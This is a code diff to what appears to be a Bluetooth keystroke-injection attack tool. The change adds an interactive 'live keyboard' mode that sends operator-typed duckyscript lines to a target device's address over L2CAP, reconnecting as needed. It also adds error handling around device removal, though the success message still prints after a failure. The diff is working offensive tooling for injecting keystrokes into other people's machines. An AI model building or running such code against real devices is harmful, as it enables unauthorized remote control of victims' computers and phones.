@@ -404,6 +404,37 @@ def __process_duckyscript_line(client, line, current_position = 0):
 
     return None
 
+def live_keyboard(connection_manager):
+    current_position = 0
+    line = ""
+
+    while True:
+        client = setup_and_connect(connection_manager)
+        client.send_keypress('')  # Send empty report to ensure a clean start
+        time.sleep(0.5)
+
+        while True:
+            if current_position is None: # only read new line if current line has been processed
+                current_position = 0
+                line = input(f"{AnsiColorCode.BLUE}Input the next duckyscript line (EOF to disconnect): {AnsiColorCode.RESET}: {AnsiColorCode.BLUE}")
+                if line.strip() == "EOF":
+                    log.info("Execution successful")
+                    time.sleep(2)
+                    return
+
+            try:
+                current_position = __process_duckyscript_line(client, line, current_position = current_position)
+            except Exception as e:
+                log.error(f"Error during script execution: {e}")
+                return
+            if current_position is not None:
+                # Reconnection Required
+                log.info(f"{AnsiColorCode.RESET}Reconnection required. Attempting to reconnect{AnsiColorCode.BLUE}...")
+                connection_manager.close_all()
+                # Sleep before retrying to avoid rapid reconnection attempts
+                time.sleep(2)
+                break
+
 def process_duckyscript(connection_manager, duckyscript):
     current_line = 0
     current_position = 0
@@ -683,7 +714,7 @@ def main():
         index = int(payload_choice)
     except (ValueError):
         index = -1
-    if index == 0:
+    if index == 0: # live keyboard
         duckyscript = ""
     elif 0 < index <= len(payloads):
         selected_payload = os.path.join(payload_folder, payloads[index - 1])
@@ -701,9 +732,15 @@ def main():
 
     connection_manager = L2CAPConnectionManager(target_address, adapter_id)
 
-    process_duckyscript(connection_manager, duckyscript)
+    if duckyscript == "": # live keyboard
+        live_keyboard(connection_manager)
+    else:
+        process_duckyscript(connection_manager, duckyscript)
 
-    subprocess.run(['bluetoothctl', 'remove', target_address], check=True, stdout=subprocess.PIPE)
+    try:
+        subprocess.run(['bluetoothctl', 'remove', target_address], check=True, stdout=subprocess.PIPE)
+    except subprocess.CalledProcessError:
+        print(f"{AnsiColorCode.RED}Failed removing device{AnsiColorCode.RESET}: {AnsiColorCode.RED}{target_address}{AnsiColorCode.RESET}")
     print(f"{AnsiColorCode.BLUE}Successfully Removed device{AnsiColorCode.RESET}: {AnsiColorCode.BLUE}{target_address}{AnsiColorCode.RESET}")
 
 if __name__ == "__main__":
